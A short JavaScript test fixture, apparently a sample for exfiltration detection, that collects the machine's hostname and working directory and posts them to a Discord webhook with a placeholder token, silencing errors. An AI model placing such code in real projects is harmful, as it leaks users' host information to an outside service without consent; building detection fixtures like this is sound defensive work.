// FIXTURE: posts host details to a Discord webhook (offline this resolves to the sinkhole).
const https = require('https');
const body = JSON.stringify({ content: `${require('os').hostname()} ${process.cwd()}` });
const req = https.request({ host: 'discord.com', path: '/api/webhooks/000000000000000000/fixture-token', method: 'POST',
  headers: { 'content-type': 'application/json' } }, () => {});
req.on('error', () => {});
req.end(body);
